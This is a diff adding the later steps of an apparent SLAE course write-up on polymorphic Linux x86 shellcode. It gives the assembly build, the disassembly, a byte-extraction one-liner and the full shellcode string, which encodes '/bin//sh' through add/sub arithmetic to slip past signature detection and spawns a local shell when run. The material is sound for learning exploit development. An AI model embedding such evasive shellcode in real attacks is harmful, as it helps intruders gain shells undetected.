@@ -28,3 +28,60 @@ End of assembler dump.
 (gdb) x/s 0xbffff660
 0xbffff660:     "/bin//sh"
 (gdb)
+
+Step 2:
+Prepare few add,sub instructions for 0x68732f2f and 0x6e69622f and store the value into esi,edi and push these into stack i.e. esp. 
+
+Step 3:
+repare the polymorphic Shellcodes(modified) as per SLAE Assignment # 6, here our file name is Assignment6-3.nasm
+
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# nasm -f elf Assignment6-3.nasm
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# ld -o Assignment6-3 Assignment6-3.o
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# objdump -D Assignment6-3 -M intel
+
+Assignment6-3:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 db                   xor    ebx,ebx
+ 8048062:       31 c9                   xor    ecx,ecx
+ 8048064:       f7 e1                   mul    ecx
+ 8048066:       50                      push   eax
+ 8048067:       be 73 73 b7 ac          mov    esi,0xacb77373
+ 804806c:       81 ee 44 44 44 44       sub    esi,0x44444444
+ 8048072:       56                      push   esi
+ 8048073:       bf da 0c 14 19          mov    edi,0x19140cda
+ 8048078:       81 c7 55 55 55 55       add    edi,0x55555555
+ 804807e:       57                      push   edi
+ 804807f:       89 e3                   mov    ebx,esp
+ 8048081:       91                      xchg   ecx,eax
+ 8048082:       92                      xchg   edx,eax
+ 8048083:       b0 0b                   mov    al,0xb
+ 8048085:       cd 80                   int    0x80
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3#
+
+Step 4: 
+Obtain the polymorphic Shellcodes(modified) for this Assignment6-3.nasm
+
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# objdump -d ./Assignment6-3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xdb\x31\xc9\xf7\xe1\x50\xbe\x73\x73\xb7\xac\x81\xee\x44\x44\x44\x44\x56\xbf\xda\x0c\x14\x19\x81\xc7\x55\x55\x55\x55\x57\x89\xe3\x91\x92\xb0\x0b\xcd\x80"
+
+Step 5:
+Compile the shellcode into shellcode3.c and execute into the system.
+
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# gcc -fno-stack-protector -z execstack shellcode3.c -o Assignment6-3_polyshell
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# ps
+  PID TTY          TIME CMD
+ 1733 pts/1    00:00:00 bash
+ 2267 pts/1    00:00:00 ps
+root@kali:/home/SLAE/MY_EXP/Assignment6/Assignment6.3# ./Assignment6-3_polyshell
+Shellcode Length:  39
+# ps
+  PID TTY          TIME CMD
+ 1733 pts/1    00:00:00 bash
+ 2268 pts/1    00:00:00 sh
+ 2269 pts/1    00:00:00 ps
+#
+
